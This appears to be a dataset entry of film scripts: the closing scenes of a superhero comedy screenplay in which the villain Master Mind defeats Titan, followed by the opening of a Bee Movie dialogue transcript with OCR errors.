Pinball machine       stands in the far corner next to a CLOSED DOOR.              Master Mind turns his attention to the action on the screen.              SCREEN              A woman dressed in a leather DOMINATRIX OUTFIT is whipping an       overweight man lying on a swing-like device with his butt       sticking out.                                  DOMINATRIX IN FILM                 YOU ARE A WORM!              She whips him three times. The man CRIES out in pain.                                  FAT MAN IN FILM                 PINEAPPLE!!! PINEAPPLE!!!              Master Mind\'s eyes are transfixed on the disturbing imagery.              The door by the pinball machine suddenly swings open.              WAYNE SCOTT, dressed in raggedy sweats, steps into the room       carrying a CAN OF BEER and a bowl of JIFFY-POP.              Master Mind cannot believe his horrified eyes.                                   MASTER MIND                 Ahhhhhh!              Wayne Scott is just as startled.                                   WAYNE SCOTT                 Jesus!              He drop his drink and snack to the floor.              The two men stare at each other as they struggle to regain       their normal breathing patterns.              Wayne Scott walks over to the couch, brushes off a thick       layer of chip crumbs, and sits down.                                  WAYNE SCOTT (CONT\'D)                 What the hell are you doing here?                                                                  95.                                                MASTER MIND                 I might just ask you the same                 question. I had thought I                 incinerated you.                                   WAYNE SCOTT                 You scared the bejesus out of me.                 How\'d you figure out I was still                 alive? Wait, how do you know my                 identity!?                                  MASTER MIND                 Roxanne told me. As for your ruse,                 I forgot to line the bottom of the                 copper cage - Somebody pointed that                 out to me recently. Figured if they                 could do it, so could you. But one                 thing I couldn\'t figure out -                                  WAYNE SCOTT                 The skeleton? Something I                 ""borrowed"" from a medical school a                 few months before.                                  MASTER MIND                 A few months? How long had you been                 planning this?                                  WAYNE SCOTT                 I always planned to retire -                 eventually. I mean, come on, you                 can\'t do this sort of thing in your                 fifties. You\'d just look                 ridiculous.              The pieces of the puzzle appear to be coming together in       Master Mind\'s head.                                  MASTER MIND                 I see it all so clearly now.              INT. MASTER MIND\'S HYDROFOIL - FLASHBACK              Master Mind and his minions cover their eyes as the       observatory explodes.                                  MASTER MIND (CONT\'D - V.O.)                 You must have done it just seconds                 before the observatory exploded.                                                                 96.                            INT. OBSERVATORY - FLASHBACK              Similar to what Titan did, Uberman bores out from under the       cage.                                  MASTER MIND (CONT\'D - V.O.)                 You bore out from under the cage.                 Then, using your Uber-Speed, -              EXT. OBSERVATORY - FLASHBACK              Running in a blur-like haze, Uberman screeches to a halt in       front of some bushes.                                  MASTER MIND (CONT\'D - V.O.)                 - you made your way to safety,                 where you had the skeleton safely                 hidden away somewhere.              EXT OBSERVATORY - SKY - DAY              Uberman soars high above the clouds. He looks down at the       observatory, which is a mere speck in the distance.                                  MASTER MIND (CONT\'D - V.O) (CONT\'D)                 Then you must have flown to a safe                 distance and waited for the                 explosion, then...              Just as the observatory explodes Uberman aims and throws the       SKELETON like a javelin.              It soars through the air like a missile, tearing through the       flames of the explosion, and crashing right into the       windshield of Master Mind\'s hydrofoil.              END OF FLASHBACK              Wayne stares at Master Mind, clearly impressed.                                  WAYNE                 Man, you ARE smart.                                   MASTER MIND                 But why fake your death? Why go                 through all of it? You could have                 just quit.                                  WAYNE SCOTT                 But the responsibility would still                 be there.

WAYNE SCOTT(cont\'d)                 A cop can retire and stop handing                 out speeding tickets - but people                 expect more from superheroes. I                 tell you, a volcano couldn\'t erupt                 in Zimbabwe without everyone                 expecting me to do something about                 it. I figured, out of sight, out of                 mind.                                   MASTER MIND                 And Wayne Scott? Why did he have to                 disappear?                                  WAYNE SCOTT                 Both of my lives have so much                 baggage. It\'s time for new baggage,                 you know?              Master Mind\'s is absolutely flabbergasted.                                  MASTER MIND                 I just can\'t believe it. This whole                 time you\'ve been in hiding while a                 force of great evil is tearing your                 city apart?              Wayne rises to his feet, waving his hands for Master Mind to       say no more.                                  WAYNE SCOTT                 I don\'t want to hear about it.                 That\'s why I don\'t have a                 television in here to remind me of                 all the things I SHOULD be doing.                 Hell, I could get a wife to do                 that.                                  MASTER MIND                 There\'s a demented supervillain out                 there about to destroy our - I                 mean, your city.              Wayne shrugs indifferently.                                  MASTER MIND                 You\'re really going to do nothing?                                  WAYNE SCOTT                 Good and evil have a way of                 balancing themselves out. If this                 guy is as bad as you say, somebody                 will rise up to fight him. It\'s                 just the order of things. You found                 me, didn\'t you?                                                                 98.                            Wayne puts a condescending hand on Master Mind\'s shoulder.                                  WAYNE SCOTT (CONT\'D)                 I know it\'s hard, but you\'ll find                 someone else someday.              He then starts walking to the door.                                  MASTER MIND                 You\'re the only one who can stop                 him.              Wayne turns around.                                  WAYNE SCOTT                 Couldn\'t if I wanted to. Gotta a                 plane to catch.                                    MASTER MIND                 A plane?                                  WAYNE SCOTT                 Going to Barbados for a little                 change in climate. Now, if you\'ll                 excuse me, I got to go pack.              He reads the still defeated look on Master Mind\'s face.                                  WAYNE SCOTT (CONT\'D)                 You were a good foe. I\'m sorry if                 I\'ve let you down. If it makes a                 difference, you were the best foe a                 hero could ask for.                                  MASTER MIND                 Not smart enough to come up with a                 full-proof trap.                                  WAYNE SCOTT                 Well, you did almost have me when                 you figured out my weakness was                 copper. Now that made me sweat a                 little. Took me way too long to                 drill out from under that cage.                                  MASTER MIND                 I got lucky.                                  WAYNE SCOTT                 Anyway, it\'s a good thing for my                 sake that I could always count on                 you for an out.                                                               99.                                                MASTER MIND                     (suddenly confused)                 What do you mean?                                  WAYNE SCOTT                 C\'mon, we always threw each other a                 couple of bones. You would always                 leave me an out in one of your                 `full-proof\' traps, and I\'d never                 had you incarcerated at a                 penitentiary that you couldn\'t                 eventually escape from. It kept our                 little game going.              Master Mind seems deflated.                                  MASTER MIND                 Game? - Was that all this ever was                 to you? You know, I was trying my                 best every time I fought you. Those                 `outs\' as you call them were                 unintentional.                                  WAYNE SCOTT                 Oh.                                  MASTER MIND                 I guess I was never really a match                 for you, was I?              Wayne shrugs.                                  MASTER MIND (CONT\'D)                     (thoughtfully)                 Then how can I expect to be one for                 Titan?              A beaten man, Master Mind heads for the door, but stops and       turns around.                                  MASTER MIND (CONT\'D)                 What about Roxanne?              Wayne unleashes an exhausted sigh.                                  WAYNE SCOTT                 I think we both got what we wanted                 out of our relationship. She got a                 career out of me, and I got plenty                 of other things out of her. But I\'m                 ready to move on to greener                 pastures.                                                                 100.                            Master Mind\'s steel hand clinches into a fist at his side.       Wayne\'s oblivious to this.                                  MASTER MIND                 I guess I wasn\'t the villain I                 thought I was, and you...you                 weren\'t the hero I thought you                 were.              He turns to make his exit when he suddenly sees ROXANNE       STANDING IN THE DOOR FRAME.              Wayne is almost at a loss for words.                                  WAYNE SCOTT                 Roxanne! How long have you been...                                  ROXANNE                 Long enough.              Roxanne looks at Master Mind.                                   ROXANNE (CONT\'D)                 Don\'t you have something else you                 can go do?              Master Mind leaves Roxanne and Wayne facing each other in       silence.              EXT. ANOTHER BAR - DAY              Titan emerges with Brad and Frank. He\'s holding a BEER CAN       and a bag of PORK RINDS.                                  TITAN                 Alright, I want this whole thing to                 look ESPN professional, understand?              A distant MECHANIZED RUMBLE can be heard. The noise rises,       signaling the approach of something powerful.              Titan and his crew walk out to the center of the plaza as the       sound becomes almost deafening.              A TANK TRACK              as it moves over the street. We PULL BACK to see a whole line       of TANKS rolling along the street.              PLAZA              From the five streets branching off the plaza, a dozen tanks       roll toward Titan.                                                                 101.                            Titan turns to Brad and Frank.                                     TITAN (CONT\'D)                    You guys are about to get some good                    footage. I might need a little                    room, though.              Brad and Frank look at each other and run to take cover       behind a nearby building.              Meanwhile, Titan nonchalantly sips from his beer as the tanks       begin to surround them.              FEEDBACK belts out of one of the tank\'s loudspeaker\'s,       causing Titan to do a mock wince.                                      TANK LOUDSPEAKER                    Titan, we have orders from the city                    of Metro to take you into custody.                    If you do not give your self up                    willingly, we will be forced to                    open fire.              There\'s a long pause as no one says anything.                                     TANK LOUDSPEAKER                    What is your answer?              Titan takes a sip of his beverage and UNLEASHES A GIGANTIC       BURP - The shockwave of which sends several of the tanks       flying into a nearby building.              Two of the remaining tanks close in on the villain. Both have       him dead to rights at point-blank range with their massive       guns.              Titan sets down his beer, then calmly plugs a fist into each       barrel.              They FIRE.              The FORCE OF THE BLAST SENDS THEM BOTH FLYING IN OPPOSITE       DIRECTIONS where they CRASH into nearby buildings.              Titan bends down and pick his beet back up.                                     TITAN                        (to beer)                    Miss me?              Titan is suddenly bombarded by a massive barrage of machine-       gun fire. The force sends him flying into the windshield of a       nearby car.                                                                 102.                            He looks up to see an APACHE ASSAULT COPTER. It\'s nose-       mounted GATLING-GUN is turning toward him.              Titan gets up to his feet and looks down at his beer can. The       bottom of it was blown apart in the blast.                                  TITAN (CONT\'D)                 Didn\'t mean to get you involved in                 all of this.              He stared daggers up at the helicopter pilot just as the gun       gets a bead on him.                                  TITAN (CONT\'D)                 Hey, man! You killed my suds!              Titan throws the can up and slaps it with the palm of his       hand.              It flies with so much force it knocks the helicopter blade       clean off. The rest of the Apache crashes to the street like       a car dropped off a building.                                  TITAN (CONT\'D)                 That\'s one was for you, beer.              Titan salutes the wreckage and walks away to find Brad and       Frank still hiding behind the building.                                  TITAN                 Guys, please tell me you got that                 last bit.                                  BRAD HELMS                 Huh?                                  TITAN                 You\'re kidding me. I give you my                 sexiest moves and you mean to tell                 me it was for nothing?                                  BRAD HELMS                 We were afraid something might hit                 us.                                  TITAN                 Looks like I\'ve given the story of                 the century to the wrong man.              He thinks about this for a moment, then it hits him.                                                              103.                                                TITAN                 Wait. What about that other                 reporter. Blond. Not so lumpy on                 the topper half, but killer legs.                                  BRAD HELMS                 Roxanne. You want Roxanne. She\'s a                 much better reporter than I am. You                 want her.                                  TITAN                 Where can I find her.                                  FRANK                 We\'re actually not supposed to give                 out that sort of information.                                  BRAD HELMS                 1314 Mockingbird Lane. I believe                 she lives in a penthouse.                                  TITAN                 You\'ve been very helpful.              He tosses Brad over his shoulder like a discarded ice cream       cone.              In the faint distance we see him splash down in the middle of       the Metro City river.              INT. ABANDONED METRO CITY LIBRARY   - DAY              Master Mind, pacing anxiously as Plato and Da Vinci pack       boxes. Obviously Master Mind is going on the lamb.                                  MASTER MIND                 Hurry, we must be on our way as                 soon as possible.                                  DA VINCI                 Master, why must we flee?                                  MASTER MIND                 I told you, Titan is too powerful.                 If he\'s set on destroying us,                 there\'s precious little we could do                 about it.                                  DA VINCI                 Where are we going?                                                              104.                                                MASTER MIND                 To another city, someplace with a                 shitload of superheroes to fight.                 We\'ll start over, we\'ll go back to                 doing what we do best.                                  PLATO                 With our tails between our legs?              The old Master Mind would never have let this comment slip       by, but as we have seen, he\'s not the same man.                                  MASTER MIND                 Plato, do you have a better plan?!              Master Mind\'s cell phone rings. He turns in shame from his       men and answers it.                                  MASTER MIND (CONT\'D)                 Hello...Roxanne?              INT. ROXANNE\'S APARTMENT              Roxanne paces back and forth on the phone.                                  ROXANNE                 What are you going to do about                 Tighten?              INTERCUT between Master Mind and Roxanne on phone.                                  MASTER MIND                 Right now I\'m packing, later I\'ll                 have a snack on the train.                                  ROXANNE                 You\'re running away?                                  MASTER MIND                 In a word - yes.                                  ROXANNE                 You created this monster...                                  MASTER MIND                 I didn\'t create this - the god\'s of                 irony did and I am eating the crow                 I so richly deserve.                                  ROXANNE                 There\'s no time for self pity.                                                              105.

You\'ll be                 safe.                                  ROXANNE                 I\'m not going anywhere.                                  MASTER MIND                 Will you listen to me, no one can                 stop him.                                   ROXANNE                 You have to try. The city needs                 your help.                                  MASTER MIND                 I\'m afraid you have an inflated                 opinion of me.                                  ROXANNE                 What the hell\'s happened to you?                 The Master Mind I knew would never                 have run from a fight even though                 he knew deep in his heart that he                 didn\'t have a chance in hell of                 winning it. It was your best                 quality. You need to be that man                 right now...I...                                  MASTER MIND                 What?                                  ROXANNE                     (heart felt)                 I believe in you.              Master Mind is taken aback, in a good way. But he catches       himself before the words swell his heart.                                  MASTER MIND                 Sweet words, but that man is dead.                 Please, Roxanne, just come with me.                                  ROXANNE                 No...I guess you are a coward after                 all.              Suddenly, there\'s a loud crash.                                                                106.                            Roxanne looks up to see a huge hunk of her ceiling has been       completely ripped off.              Titan is flying above, holding the debris as casually as if       it were a paper plate at a barbecue.              He looks down at her and smiles.                                  TITAN                 Man, have I got a story for you.              Master Mind can hears Titan\'s familiar laugh from his side of       the line.                                  MASTER MIND                 Roxanne? Roxanne?              EXT. KINGPIN BOWLING - DAY              Titan is standing in front of the bowling alley, trying to       decide on an appropriate pose for the occasion.                                  TITAN                 What pose would be best? The corny                 folded arms thing?              He demonstrates, arching his chin proudly in the air.                                  TITAN                 Or maybe on the hips, like this.              It\'s the classic Superman pose, only not as masculine.                                  TITAN                 No, makes me look like a flamer                 pirate.              As Titan starts to fix his hair in the window, Frank pretends       to fix the lens on his camera as he speaks to Roxanne.                                  FRANK                     (whispering)                 Shouldn\'t we be making a run for it                 right about now?                                  ROXANNE                     (whispering)                 The guy can outrun bullets. I don\'t                 think either one of us is in that                 kind of shape.                                  TITAN                 She\'s right, Frank.                                                              107.                            Frank looks up, stunned that Titan could have possibly heard       him.                                  TITAN                 Also got super hearing. I promise                 not to keep the both of you long,                 but you\'ll thank me when this is                 all over.              Frank and Roxanne exchange helpless expressions.              INT. ABANDONED METRO CITY LIBRARY   - DAY              Master Mind reverently stares up at the painted portrait of       his father.                                  MASTER MIND                 Dad, it\'s me...                     (he looks around to make                      sure no one can hear)                 ...Bubsy. I know we haven\'t talked                 in a while, and I\'m sorry. It\'s                 been a little crazy trying to live                 up to a legacy.              The painting\'s menacing stare seems to reach into his very       soul.                                  MASTER MIND                 Anyway...You raised me to be the                 worst that I could possibly be. And                 I\'ve tried to live up to that as                 best as I could - even dropping out                 of dentistry school like you wanted                 me to. But I\'m about to do                 something now that would really                 piss you off. I\'m going to go                 against everything you ever taught                 me. I hope...I hope that maybe                 you\'ll look down at what I\'m about                 to do as not so much a good deed,                 but more like the outright defiance                 of a hateful and ungrateful, son.                 If you could do that, then maybe -                 in your own little way - you could -                 for probably the first time - find                 a reason to be proud of me.              He looks back up at the picture. Is it our imagination, or       does the painting\'s stare suddenly seem even angrier?                                                              108.                                                    MASTER MIND                    Well...either way, you\'re probably                    going to see me real soon.

ABANDONED METRO CITY LIBRARY     - CONTINUOUS              Da Vinci stops in front of a television set, seeing the news       report in progress.

We now go to her with a live                    report.

CITY STREET - DAY              Roxanne is standing in front of a camera with a mike in her       hand.                                  ROXANNE                 I\'m here with the cause of the                 destruction in Metro City. He has                 kidnapped me and a cameraman to                 chronicle what he refers to as the                 creation of a monument to his                 invincibility and overall                 ""Asskickiness."" He will use this                 giant concrete bowling ball to play                 the largest game of bowling ever                 using the buildings of downtown                 Metro City as his pins.              Titan suddenly steps into the shot.                                  TITAN                 And I\'m going for the biggest                 strike ever.              He leans into the camera.                                  TITAN                 And you, Metro City, have a                 ringside seat as I cement my name                 in the anal of history.

CITY STREET - MOMENTS LATER              Titan holds up the massive bowling ball, lining up his shot.                                  TITAN                     (in quiet professional                      bowler announcer voice)                 Like Tiger before him, a young                 savior has come to raise a sport                 from the ashes. Rookie Hal Stewart,                 a young man with a dream, realizing                 that dream here today, folks.

TITAN(cont\'d)                 One might click there heels and say                 ""There\'s no place like home"" upon                 finding themselves in such a                 fantasy. Well, Hal looks very much                 at home right were he is - with a                 ball in hand and glory in his                 sights.              INT. METRO CITY LIBRARY - CONTINUOUS              In the bowels of Master Mind\'s hideout, the HYDROGEN REACTOR       glows and HUMS MENACINGLY.              BACK TO SCENE              Roxanne just stand helpless as Frank films away.                                  ROXANNE                 Hal, I know everyone treated you                 like shit, but you don\'t have to do                 this.                                  TITAN                 You\'re right. I don\'t HAVE to do                 anything. Isn\'t that cool?              Titan lines up his shot.                                  TITAN                 Here\'s one for the record books!              Titan flies a few feet and rolls the ball down the main       street.              ROXANNE              Her face is utter horror as she watches the inevitable       destruction of Metro City.              As the ball rolls - it demolishes everything in it\'s wake;       cars, street lamps - windows shatter as the giant concrete       sphere brushes along side buildings.              TITAN              He smiles in anticipation and uses ""body English"" to direct       the ball.              GIANT BOWLING BALL POV              It\'s nearly halfway to its target.              ROXANNE                                                              111.                            She closes her eyes.              Titan\'s smile fades. He looks around as if he hears something       we don\'t.              About two hundred feet in front of the first building a GIANT       SPIDER WEB flies across the path of the ball, creating a       defensive barrier. An enormous letter ""M"" is etched in the       web\'s center.                                  TITAN (CONT\'D)                 What the...?              The ball breaks through the web, but it\'s speed is greatly       reduced.                                  FRANK                 Look, what\'s that flying in the                 air?              We suddenly see MASTER MIND FLYING OVER THE ROLLING BALL IN A       JET PACK.              He quickly pulls out his goo gun and starts laying down a       path of sticky plasm to stop the destructive sphere\'s path.                                  MASTER MIND                 C\'mon, slow down              Master Mind looks down to see the meter of the gun close to       empty.                                     MASTER MIND                 C\'mon.              The ball slows drastically then starts rolling to the side.       It heads off an embankment and rolls harmlessly into a CANAL.                                  MASTER MIND                 Gutterball!              TITAN              He\'s furious to say the least.                                     TITAN                 YOU!              Master Mind gives him a mocking grin.                                  MASTER MIND                 Bowling? What other trailer park                 sports can you play?                                                                 112.                                                  TITAN                   You are becoming a real pain in my                   ass. I should have done this a long                   time ago.              Titan lunges at his tormentor. Master Mind hits the BOOSTER       on his jet pack and heads back toward the other side of the       city with Titan in hot pursuit.                                    MASTER   MIND (CONT\'D)                       (into walkie   talkie)                   Plato, Da Vinci.   Secure Roxanne,                   he\'s falling for   it.              ELSEWHERE              A flustered Titan lands. He begins searching the city       streets, but Master Mind is nowhere in sight.              He turns upon hearing an EEKING sound to his left.              Sitting on the ground is a CHIMPANZEE wearing a strange       collar. It smiles at him.                                    TITAN                   What the hell?              From behind, Titan is immediately set upon by five more RADIO       CONTROLLED APES.                                      TITAN (CONT\'D)                   GODAMNIT!              The critters bite hop and hit Titan. As soon as he throws one       off two more jump him.              Titan breaks free and with his mighty breath blows them       across the street into a fruit stand. With Titan out of their       sight they begin to attack the fruit.              MASTER MIND              He\'s a block away frantically hitting his remote.                                    MASTER MIND                   Shit! Stupid monkeys and their                   fruit.              Titan flies away from the mad monkeys and lands to find       Master Mind sitting on the ground wrapped in a long cape with       only his head sticking out.                                                              113.                                                TITAN (CONT\'D)                 No more games.              Titan FIRES HIS LASER VISION AT MASTER MIND\'s CHEST.              Master Mind pulls the cloak away to reveal a FIRE HYDRANT.       Titan\'s EYE LASERS burn through the hydrant releasing a high       pressure stream of water.              Master Mind uses the last remote which dumps two tons of       CEMENT mix into the truck.              The crowd, police and news crews move in closer when Titan       doesn\'t emerge.              Master Mind drops his last remote and walks toward the truck       cautiously.                                  MASTER MIND                 Could it really be that easy--              - BOOM - The back of the truck explodes, throwing dust and       concrete everywhere. When the dust clears we see and enraged       Titan.                                  MASTER MIND (CONT\'D)                 Didn\'t think so.              As the villain walks toward him, he pulls back his fist to       give Master Mind the killing blow.                                  TITAN                 If you don\'t mind, I\'m going to                 punch trough your face now.              Preparing himself for the end, Master Mind shuts his eyes as       a SUDDEN GUST OF WIND BEGINS TO PICK UP.              AS Titan goes to strike, a BLURRY FIGURE RUNS IN AND SNATCHES       MASTER MIND OUT OF THE AWAY.              Stunned, Master Mind begins to feel around his body as if to       make sure everything\'s still in place.                                     MASTER MIND                 I\'m alive.              He turns to see UBERMAN standing next to him.                                     MASTER MIND                 Uberman?                                                              114.                            The terrified bystanders start to notice the figure standing       next to Master Mind.                                  BYSTANDER 1                 It\'s Uberman!                                  BYSTANDER 2                 Uberman\'s alive!                                  BYSTANDER 3                 We\'re saved!              As the CROWD CHEERS, A confused Master Mind turns to Metro       City\'s newly resurrected champion.                                     MASTER MIND                 I thought.                                     UBERMAN                 So did I.              He puts a hand on Master Mind\'s shoulder.                                  UBERMAN                 Thank you, old enemy.                                     MASTER MIND                 For what?                                  UBERMAN                 Showing me the error of my ways,                 Showing me I\'m meant to be this                 city\'s savior, showing me that,                 while we can try, there is no                 running away from our true destiny.              With that, UBERMAN IS STRICKEN BY A LASER BLAST, INSTANTLY       TURNING HIM INTO A CHARRED HUMAN SKELETON.              Master Mind turns to see Titan smiling with his STILL SMOKING       EYES.                                  TITAN                 Oh...Did I interrupt something?              Master Mind turns to run, but, suddenly Titan is before him.                                  TITAN                 Where you going, buddy?              Titan grabs Master Mind by the collar and throws him across       the street into a parked car.                                                                 115.                                                TITAN (CONT\'D)                 Welcome to Paintown. Population:                 you.              Master Mind manages to stand on shaky legs. He seems in a       daze, unable to move.              Titan flies up in the air.                                  TITAN (CONT\'D)                 Time to finish this.              With his fist front and center, Titan speeds toward Master       Mind. He\'s like a human torpedo, coming in for the killing       blow.              Master Mind comes to his senses and puts up his hands.                                  MASTER MIND                 WAIT!!!              Titan screeches to a halt and stops just in front of him like       an old Warner Bros cartoon.                                  TITAN                 What?                                  MASTER MIND                 Quick joke - What\'s the capital of                 Thailand?                                  TITAN                 Huh - I don\'t know.                                  MASTER MIND                 It\'s bang cock!              In a sudden surge of strength, MASTER MIND PUNCHES TITAN IN       THE GROIN.              The once mighty man instantly drops to his knees, searching,       with tears in his eyes, for the proper word to express the       pain suddenly surging through his member.                                  TITAN (CONT\'D)                 Ow.              Baffled, he looks up at Master Mind\'s hand and sees his       gauntlet is now made ENTIRELY OUT OF COPPER.                                   MASTER MIND                 So, I guess pennies are good for                 something.                                                              116.                            He punches Titan in the face, knocking him out cold.              Master Mind looks down on Titan with more than a little       pride. Suddenly he hears something behind him. He spins to       see the crowd making a strange noise - APPLAUSE.              Roxanne comes up to him.              The crowd starts to go wild and cheers for Master Mind. He\'s       not sure what to make of it.                                  ROXANNE                 Pretty strange, huh?                                  MASTER MIND                 They\'re cheering for me.                                  ROXANNE                 You saved them. You saved                 everybody. How\'s it feel?              Master Mind looks at the smiles all around him. He begins to       well up a little.                                  MASTER MIND                 It\'s a...it\'s nice, you know? I                 usually don\'t get a lot of                 feedback.                     (whispering)                 But I also kind of caused all this.                 What happens when they find that                 out I was the cause of some of                 this?              Roxanne looks at the cheering crowd, then back at Master       Mind.                                  ROXANNE                 What they don\'t know won\'t hurt                 them.                                  MASTER MIND                 I guess that is all in the past.                                  ROXANNE                 You\'re the hero.                                  MASTER MIND                 I don\'t think I\'d go that far...I                 mean I just...er...                                  ROXANNE                 Master Mind?                                                              117.                                                   MASTER MIND                    Yes?                                     ROXANNE                    Stop talking.              She kisses him.              The crowd erupts in a cheer.              TELEVISION              The channel 7 he channel 7 logo zooms in followed by the       title ""Eye on Metro City.""              A picture of Master Mind smiling appears on the screen behind       her.                                     SAMANTHA SUMMERS                    Who\'s bad? Well, not Master Mind.                    It seems the former villain has                    done a career 180 after defeating                    Tighten and saving Metro City from                    certain enslavement. And here he is                    getting a full pardon by Metro                    City\'s Mayor, Steve Dent.              Cut to ceremony on capital steps. The MAYOR is shaking Master       Mind\'s metal gauntlet when it suddenly STARTS TO CRUSH HIS       HAND.                                     MAYOR                    Ahhh!              Secret service men quickly start to draw their weapons and       take aim at Master Mind.              Realizing what\'s happening, he quickly lets the mayor\'s hand       go and puts his arms in the air.                                     MASTER MIND                    Sorry - Metal hand. Force of habit.              He elbows the mayor.                                     MASTER MIND (CONT\'D)                     We\'re okay, right?              Wincing, the mayor signals the men to put their guns down.              WE CUT to video of Titan behind bars in a regular prison.                                                              118.                                                BRAD HELMS                 And what about Tighten? Is there a                 prison in existence that can hold                 this super powered menace? Well,                 the answer we found is no.              A man in a white lab coat stands in front of Titan\'s cell       just out of reach.                                  PRISON SCIENTIST                 Of course normally he could break                 out of there anytime, but as you                 can see we\'ve taken some special                 precautions.              The news camera pans over see Titan in his cell wearing a       copper JOCK STRAP with electrical cables hooked to it.              Back to Samantha at the desk.                                  BRAD HELMS                 What is a Hero? It seems never has                 that question needed to be asked                 more than it does tonight. We go to                 our very own Roxanne Ritchi, making                 her triumphant return to our news                 desk for the answer.              Brad turns. The camera pans over to Roxanne who we now see       has been sitting beside him.                                  ROXANNE                 What is a hero? Well, there are                 many different kinds. There are                 those who hear a call, like the                 policeman or doctor, then there\'s                 the kind the public creates in                 their search for meaning and hope.                 Then, there are those who have the                 courage to change.              DARK ALLEY - NIGHT              A woman is being chased by two large thugs. They\'re gaining       on her.              She comes to a brick wall - a dead end.              The thugs laugh.                                  THUG #1                 Hey, gimme that purse?                                                              119.                                                MASTER MIND (O.S)                 I don\'t think it would go with your                 outfit.              The thugs turn around to see Master Mind, standing with his       arms folded across his chest.                                  THUG #2                 It\'s Master Mind!              Thug #1 draws a knife.                                  THUG #1                 So? It\'s not like he has any                 superpowers.              Thug #1 puts his fingers to his mouth and whistles.              Suddenly two more Thugs appear behind Master Mind.                                   MASTER MIND                 I\'m gonna give you a chance to                 surrender.                                  THUG #1                 Four against one. For a Master                 Mind, you\'re really bad at math.              Master Mind throws a hand signal up in the air.              Suddenly a giant robotic foot crashes down on the two men       behind him.              Thug #1 and Thug #2 drop their knives and raise their hands       in the air.              Master Mind looks up and waves.                                  MASTER MIND                 Way to take out those two goons,                 guys!              We see Da Vinci and Plato at the wheel of a gigantic robot.                                  DA VINCI                 What two goons?              The giant robot lifts its foot to check the bottom of it\'s       sole. It KNOCKS OVER WATER TOWER in the process.              The woman looks at Master Mind, horrified.                                             120.                                                MASTER MIND                     (apologetically)                 Sorry, we\'re new at this.                                                THE END",,25

Its wings are too small to get its fat little body off the ground.     The bee, of course, flies anyway     because bees don\'t care what humans think is impossible.     Yellow, black. Yellow, black. Yellow, black. Yellow, black.     Ooh, black and yellow! Let\'s shake it up a little.     Barry! Breakfast is ready!     Ooming!     Hang on a second.     Hello?     - Barry? - Adam?     - Oan you believe this is happening? - I can\'t. I\'ll pick you up.     Looking sharp.     Use the stairs. Your father paid good money for those.     Sorry. I\'m excited.     Here\'s the graduate. We\'re very proud of you, son.     A perfect report card, all B\'s.     Very proud.     Ma! I got a thing going here.     - You got lint on your fuzz. - Ow! That\'s me!     - Wave to us! We\'ll be in row 118,000. - Bye!     Barry, I told you, stop flying in the house!     - Hey, Adam. - Hey, Barry.     - Is that fuzz gel? - A little. Special day, graduation.     Never thought I\'d make it.     Three days grade school, three days high school.     Those were awkward.     Three days college. I\'m glad I took a day and hitchhiked around the hive.     You did come back different.     - Hi, Barry. - Artie, growing a mustache? Looks good.     - Hear about Frankie? - Yeah.     - You going to the funeral? - No, I\'m not going.     Everybody knows, sting someone, you die.     Don\'t waste it on a squirrel. Such a hothead.     I guess he could have just gotten out of the way.     I love this incorporating an amusement park into our day.     That\'s why we don\'t need vacations.     Boy, quite a bit of pomp... under the circumstances.     - Well, Adam, today we are men. - We are!     - Bee-men. - Amen!     Hallelujah!     Students, faculty, distinguished bees,     please welcome Dean Buzzwell.     Welcome, New Hive Oity graduating class of...     ...9:15.     That concludes our ceremonies.     And begins your career at Honex Industries!     Will we pick ourjob today?     I heard it\'s just orientation.     Heads up! Here we go.     Keep your hands and antennas inside the tram at all times.     - Wonder what it\'ll be like? - A little scary.     Welcome to Honex, a division of Honesco     and a part of the Hexagon Group.     This is it!     Wow.     Wow.     We know that you, as a bee, have worked your whole life     to get to the point where you can work for your whole life.     Honey begins when our valiant Pollen Jocks bring the nectar to the hive.     Our top-secret formula     is automatically color-corrected, scent-adjusted and bubble-contoured     into this soothing sweet syrup     with its distinctive golden glow you know as...     Honey!     - That girl was hot. - She\'s my cousin!     - She is? - Yes, we\'re all cousins.     - Right. You\'re right. - At Honex, we constantly strive     to improve every aspect of bee existence.     These bees are stress-testing a new helmet technology.     - What do you think he makes? - Not enough.     Here we have our latest advancement, the Krelman.     - What does that do? - Oatches that little strand of honey     that hangs after you pour it. Saves us millions.     Oan anyone work on the Krelman?     Of course. Most bee jobs are small ones. But bees know     that every small job, if it\'s done well, means a lot.     But choose carefully     because you\'ll stay in the job you pick for the rest of your life.     The same job the rest of your life? I didn\'t know that.     What\'s the difference?     You\'ll be happy to know that bees, as a species, haven\'t had one day off     in 27 million years.     So you\'ll just work us to death?     We\'ll sure try.     Wow! That blew my mind!     ""What\'s the difference?"" How can you say that?     One job forever? That\'s an insane choice to have to make.     I\'m relieved. Now we only have to make one decision in life.     But, Adam, how could they never have told us that?     Why would you question anything? We\'re bees.     We\'re the most perfectly functioning society on Earth.     You ever think maybe things work a little too well here?     Like what? Give me one example.     I don\'t know. But you know what I\'m talking about.     Please clear the gate. Royal Nectar Force on approach.     Wait a second. Oheck it out.     - Hey, those are Pollen Jocks! - Wow.     I\'ve never seen them this close.     They know what it\'s like outside the hive.     Yeah, but some don\'t come back.     - Hey, Jocks! - Hi, Jocks!     You guys did great!     You\'re monsters! You\'re sky freaks! I love it! I love it!     - I wonder where they were. - I don\'t know.     Their day\'s not planned.     Outside the hive, flying who knows where, doing who knows what.     You can\'tjust decide to be a Pollen Jock. You have to be bred for that.     Right.     Look. That\'s more pollen than you and I will see in a lifetime.     It\'s just a status symbol. Bees make too much of it.     Perhaps. Unless you\'re wearing it and the ladies see you wearing it.     Those ladies? Aren\'t they our cousins too?     Distant. Distant.     Look at these two.     - Oouple of Hive Harrys. - Let\'s have fun with them.     It must be dangerous being a Pollen Jock.     Yeah. Once a bear pinned me against a mushroom!     He had a paw on my throat, and with the other, he was slapping me!     - Oh, my! - I never thought I\'d knock him out.     What were you doing during this?     Trying to alert the authorities.     I can autograph that.     A little gusty out there today, wasn\'t it, comrades?     Yeah. Gusty.     We\'re hitting a sunflower patch six miles from here tomorrow.     - Six miles, huh? - Barry!     A puddle jump for us, but maybe you\'re not up for it.     - Maybe I am. - You are not!     We\'re going 0900 at J-Gate.     What do you think, buzzy-boy? Are you bee enough?     I might be. It all depends on what 0900 means.     Hey, Honex!     Dad, you surprised me.     You decide what you\'re interested in?     - Well, there\'s a lot of choices. - But you only get one.     Do you ever get bored doing the same job every day?     Son, let me tell you about stirring.     You grab that stick, and you just move it around, and you stir it around.     You get yourself into a rhythm. It\'s a beautiful thing.     You know, Dad, the more I think about it,     maybe the honey field just isn\'t right for me.     You were thinking of what, making balloon animals?     That\'s a bad job for a guy with a stinger.     Janet, your 